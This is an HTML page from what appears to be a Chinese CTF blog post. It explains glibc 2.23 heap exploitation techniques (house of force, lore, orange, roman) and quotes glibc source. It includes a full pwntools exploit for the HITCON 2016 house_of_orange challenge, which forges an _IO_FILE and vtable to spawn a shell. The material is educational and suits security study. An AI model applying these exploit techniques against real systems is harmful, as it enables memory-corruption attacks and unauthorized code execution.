@@ -1,0 +1,1640 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/safari_pinned_tab.svg?v=6.5.0" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.5.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="house全家桶 house_of_force house_of_force利用过程就是改写top chunk为一个很大的值,然后通过malloc一个计算后的值进行任意地址分配.即通过malloc一个chunk,使得top chunk缩减到需要控制的区域,然后就可以malloc出需要控制的区域. 例如:想要改写的变量位置在target,top chunk的位置在top,再算上head的大小,">
+<meta name="keywords" content="Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IS-pwn-Linux-glibc-2.23-利用大全">
+<meta property="og:url" content="https://hitworld.github.io/posts/8cac881e/index.html">
+<meta property="og:site_name" content="w4rd3n">
+<meta property="og:description" content="house全家桶 house_of_force house_of_force利用过程就是改写top chunk为一个很大的值,然后通过malloc一个计算后的值进行任意地址分配.即通过malloc一个chunk,使得top chunk缩减到需要控制的区域,然后就可以malloc出需要控制的区域. 例如:想要改写的变量位置在target,top chunk的位置在top,再算上head的大小,">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-08-25T15:48:49.731Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="IS-pwn-Linux-glibc-2.23-利用大全">
+<meta name="twitter:description" content="house全家桶 house_of_force house_of_force利用过程就是改写top chunk为一个很大的值,然后通过malloc一个计算后的值进行任意地址分配.即通过malloc一个chunk,使得top chunk缩减到需要控制的区域,然后就可以malloc出需要控制的区域. 例如:想要改写的变量位置在target,top chunk的位置在top,再算上head的大小,">
+
+
+
+
+
+
+  <link rel="canonical" href="https://hitworld.github.io/posts/8cac881e/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>IS-pwn-Linux-glibc-2.23-利用大全 | w4rd3n</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w4rd3n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">混吃等死</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>友链</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hitworld.github.io/posts/8cac881e/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w4rd3n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/apple-touch-icon.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w4rd3n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">IS-pwn-Linux-glibc-2.23-利用大全
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-06-11 18:34:16" itemprop="dateCreated datePublished" datetime="2020-06-11T18:34:16+08:00">2020-06-11</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/IS/" itemprop="url" rel="index"><span itemprop="name">IS</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/IS/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/posts/8cac881e/" class="leancloud_visitors" data-flag-title="IS-pwn-Linux-glibc-2.23-利用大全">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度：</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">18k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">16 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="house全家桶">house全家桶</h2>
+<h3 id="house_of_force">house_of_force</h3>
+<p><code>house_of_force</code>利用过程就是改写<code>top chunk</code>为一个很大的值,然后通过<code>malloc</code>一个计算后的值进行任意地址分配.即通过<code>malloc</code>一个<code>chunk</code>,使得<code>top chunk</code>缩减到需要控制的区域,然后就可以<code>malloc</code>出需要控制的区域.</p>
+<p>例如:想要改写的变量位置在<code>target</code>,<code>top chunk</code>的位置在<code>top</code>,再算上<code>head</code>的大小,只需要<code>malloc</code>出<code>target - top - 0x10</code>个字节(可以为负数,溢出运算).</p>
+<h3 id="house_of_lore">house_of_lore</h3>
+<p><code>house_of_lore</code>通过改写<code>small bin chunk</code>的<code>bk</code>指针,同时在可控内存区域构造一个<code>fake small bin</code>链表,从而劫持<code>small bin</code>分配一个<code>fake chunk</code>出来.</p>
+<p>由于空闲<code>small bin chunk</code>取出时要过<code>fd</code>,<code>bk</code>的<code>pass</code>.所以链表要够长.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt;bk = buf1</span><br><span class="line">buf1-&gt;fd = chunk_ptr</span><br><span class="line">buf1-&gt;bk = buf2</span><br><span class="line">buf2-&gt;fd = buf1</span><br></pre></td></tr></table></figure>
+<p>伪造后<code>malloc</code>同大小<code>chunk</code>,由于<code>chunk_ptr-&gt;fd</code>被插入<code>small bin</code>时被设置为了对应<code>small bin head</code>,<code>bk</code>和<code>fd</code>成功<code>pass</code>.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf1-&gt;fd = small_bin_head</span><br><span class="line">buf1-&gt;bk = buf2</span><br><span class="line">buf2-&gt;fd = buf1</span><br></pre></td></tr></table></figure>
+<p>再次<code>malloc</code>成功获取伪造区域的指针.注意,此后再<code>malloc</code>该大小的<code>chunk</code>就会失败.</p>
+<h3 id="house_of_orange">house_of_orange</h3>
+<p><code>house_of_orange</code>利用环境.</p>
+<ul>
+<li>没有<code>free</code>.</li>
+<li>存在堆溢出或者其他可改写<code>top_chunk</code>大小的漏洞.</li>
+</ul>
+<p>第一步是泄露地址.</p>
+<p>通过堆溢出修改<code>top_chunk</code>的大小,如果<code>malloc</code>申请的堆块大小超过了<code>top_chunk</code>的大小,将调用<code>sysmalloc</code>来进行分配.<code>sysmalloc</code>针对这种情况有两种处理,如果申请大小大于等于<code>mp_.mmap_threshold</code>就直接调用<code>mmap</code>,否则就扩展<code>top_chunk</code>.</p>
+<p>扩展<code>top_chunk</code>前有<code>assert</code>检测.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);<span class="comment">//无用</span></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; pagemask) == <span class="number">0</span>));</span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>
+<p>要求修改后的<code>top_chunk_size</code>必须满足如下条件.</p>
+<ul>
+<li><code>top_chunk_size &gt; MINSIZE</code>.<code>#define MINSIZE (unsigned long)(((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</code>.</li>
+<li><code>top_chunk</code>需要有<code>pre_in_use</code>的标志(<code>top_chunk &amp; 1 = 1</code>).</li>
+<li><code>top_chunk</code>的尾部要求页对齐(由于原<code>top_chunk_size</code>满足该条件,所以<code>fake = real % 0x1000 + n * 0x1000</code>).</li>
+<li><code>top_chunk_size</code>小于申请分配的内存.</li>
+</ul>
+<p>满足条件后就会继续往下执行,最后把<code>old_top</code>释放.这样就可以得到一个<code>unsort_bin</code>.再次<code>malloc</code>即可泄露<code>libc</code>,还可以通过<code>large bin</code>泄露<code>heap</code>.</p>
+<p>第二步就是劫持控制流.</p>
+<p>劫持控制流使用的是<code>File Stream Oriented Programming</code>,用于触发的函数是用于输出错误信息的<code>malloc_printerr</code>,<code>malloc_printerr</code>其实是调用<code>__libc_message</code>函数之后调用<code>abort</code>函数,<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>,所以只需要劫持<code>IO_FILE_plus</code>虚表中的这个函数即可.</p>
+<p>通过<code>unsortbin attack</code>修改<code>_IO_list_all</code>为<code>unsorted_chunks (av)</code>,这样<code>_IO_list_all</code>会将<code>unsorted_chunks (av)</code>处当作一个<code>_IO_FILE</code>结构体,调用<code>_IO_flush_all_lockp</code>时由于第一个<code>_IO_FILE</code>结构体可能不符合检测(<code>_mode</code>字段<code>1/2</code>几率通过),就会通过<code>chain</code>字段跳转到下一个<code>IO_FILE_plus</code>.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ./libio/genops.c</span></span><br><span class="line"><span class="keyword">int</span> _IO_flush_all_lockp (<span class="keyword">int</span> do_lock) &#123;</span><br><span class="line">    <span class="comment">/* code */</span></span><br><span class="line">    <span class="keyword">while</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        run_fp = fp;</span><br><span class="line">        <span class="keyword">if</span> (do_lock)</span><br><span class="line">	        _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">	    || (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">	    ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">        <span class="comment">//#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH),所以满足前两个就会发生调用.</span></span><br><span class="line">	        result = EOF;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (do_lock)</span><br><span class="line">	        _IO_funlockfile (fp);</span><br><span class="line">        run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp) &#123;</span><br><span class="line">	        fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	        last_stamp = _IO_list_all_stamp;</span><br><span class="line">	    &#125; <span class="keyword">else</span></span><br><span class="line">	        fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_lock_unlock (list_all_lock);</span><br><span class="line">    __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>_IO_FILE</code>结构体的<code>chian</code>字段(偏移为<code>0x68</code>)是<code>bins</code>的<code>index</code>为<code>6</code>的地方,也就是满足大小为<code>0x70</code>的<code>chunk</code>.只需要再次利用漏洞将<code>unsorted bin</code>大小改为<code>0x70</code>,同时满足以下检测即可劫持虚表.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) || (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)))</span><br></pre></td></tr></table></figure>
+<p><code>hitcon-2016-house_of_orange payload</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(length, name, price, color)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Length of name :"</span>, str(length))</span><br><span class="line">    r.sendafter(<span class="string">"Name :"</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">"Price of Orange:"</span>, str(price))</span><br><span class="line">    r.sendlineafter(<span class="string">"Color of Orange:"</span>, str(color))</span><br><span class="line">    r.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(length, name, price, color)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Length of name :"</span>, str(length))</span><br><span class="line">    r.sendafter(<span class="string">"Name:"</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">"Price of Orange: "</span>, str(price))</span><br><span class="line">    r.sendlineafter(<span class="string">"Color of Orange: "</span>, str(color))</span><br><span class="line">    r.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./houseoforange"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x100</span>, <span class="string">"a"</span> * <span class="number">0x100</span>, <span class="number">0x100</span>, <span class="number">1</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x100</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x1f00000100</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0xeb1</span>)</span><br><span class="line">upgrade(<span class="number">0x1000</span>, payload, <span class="number">0x100</span>, <span class="number">1</span>)</span><br><span class="line">build(<span class="number">0x1000</span>, <span class="string">"b"</span> * <span class="number">0x1000</span>, <span class="number">0x1000</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">#free(top_chunk)</span></span><br><span class="line"></span><br><span class="line">build(<span class="number">0x400</span>, <span class="string">"c"</span> * <span class="number">0x8</span>, <span class="number">0x400</span>, <span class="number">3</span>)</span><br><span class="line">libc = u64(see().split(<span class="string">"c"</span> * <span class="number">0x8</span>)[<span class="number">1</span>][:<span class="number">6</span>].ljust(<span class="number">8</span> , <span class="string">"\x00"</span>)) - <span class="number">0x3c5188</span></span><br><span class="line">upgrade(<span class="number">0x1000</span>, <span class="string">"c"</span> * <span class="number">0x10</span>, <span class="number">0x1000</span>, <span class="number">2</span>)</span><br><span class="line">heap = u64(see().split(<span class="string">"c"</span> * <span class="number">0x10</span>)[<span class="number">1</span>][:<span class="number">6</span>].ljust(<span class="number">8</span> , <span class="string">"\x00"</span>)) - <span class="number">0x1b0</span></span><br><span class="line"><span class="comment">#leak heap and libc</span></span><br><span class="line"></span><br><span class="line">payload = p64(libc + <span class="number">0x3c5188</span>) * <span class="number">2</span> + p64(heap + <span class="number">0x1b0</span>) * <span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>, <span class="string">"\x00"</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x2000001000</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="string">"/bin/sh\x00"</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) + p64(libc + <span class="number">0x3c5520</span> - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3c5520 D _IO_list_all, fake_bk = _IO_list_all - 0x10</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">1</span>) * <span class="number">18</span> + p32(<span class="number">0x80000000</span>) + <span class="string">"a"</span> * <span class="number">0x14</span></span><br><span class="line"><span class="comment">#_IO_write_base, _IO_write_ptr, padding, _mode, _unused2</span></span><br><span class="line">fake_chunk += p64(heap + <span class="number">0x7e0</span>)</span><br><span class="line"><span class="comment">#fake_vtable_ptr</span></span><br><span class="line">fake_chunk = fake_chunk.ljust(<span class="number">0x200</span>, <span class="string">"\x00"</span>)</span><br><span class="line"><span class="comment">#fake_chunk &lt;=&gt; fake_IO_FILE</span></span><br><span class="line"></span><br><span class="line">payload += fake_chunk</span><br><span class="line">payload += p64(libc + <span class="number">0x45390</span>) * <span class="number">0x10</span></span><br><span class="line"><span class="comment">#fake_vtable</span></span><br><span class="line">upgrade(<span class="number">0x1000</span>, payload, <span class="number">0x1000</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r, "b genops.c:772")</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc: "</span> + hex(libc)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap: "</span> + hex(heap)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="house_of_roman">house_of_roman</h3>
+<p><code>house_of_roman</code>利用条件,可以修改<code>free chunk</code>的<code>fd</code>,可以溢出下一个<code>chunk</code>的<code>size</code>.</p>
+<ol type="1">
+<li>首先分配<code>3</code>个<code>chunk</code>,大小分别为<code>0x20</code>,<code>0xd0</code>,<code>0x70</code>.</li>
+<li>在<code>chunk2 + 0x78</code>处设置<code>p64(0x61)</code>,作用是<code>fake size</code>,用于后面的<code>fastbin attack</code>.</li>
+<li>释放掉<code>chunk2</code>,再次分配<code>0xd0</code>,会分配到<code>chunk2</code>,此时<code>chunk2 + 0x10</code>和<code>chunk2 + 0x18</code>中存在<code>main_arean</code>地址.</li>
+<li>然后再分配<code>3</code>个大小<code>0x70</code>的<code>chunk</code>,释放<code>chunk3</code>,<code>chunk4</code>,此时<code>chunk4-&gt;fd = chunk3</code>.修改<code>chunk4-&gt;fd</code>的低字节,使得<code>chunk4-&gt;fd = chunk2</code>.</li>
+<li>修改<code>chunk2-&gt;size = 0x71</code>.此时<code>chunk2-&gt;fd</code>为<code>main_arean</code>地址,通过修改低<code>2</code>个字节,可以修改到<code>malloc_hook - 0x23</code>处(注意,这里需要爆破<code>1/16</code>),然后分配<code>3</code>次<code>0x70</code>的<code>chunk</code>拿到包含<code>malloc_hook</code>的<code>chunk</code>.</li>
+<li>此时<code>malloc_hook</code>内容为<code>0</code>,然后利用<code>unsorted bin</code>修改<code>malloc_hook</code>内容为<code>main_arean</code>的地址,利用部分写修改<code>malloc_hook</code>为<code>one_gadget</code>(注意,这里需要爆破<code>1/4096</code>).</li>
+<li>多次释放一个指针,触发<code>double free</code>异常,进而触发<code>malloc_printerr</code>,<code>getshell</code>.</li>
+</ol>
+<p>该攻击方式源于:<code>https://github.com/romanking98/House-Of-Roman</code>.</p>
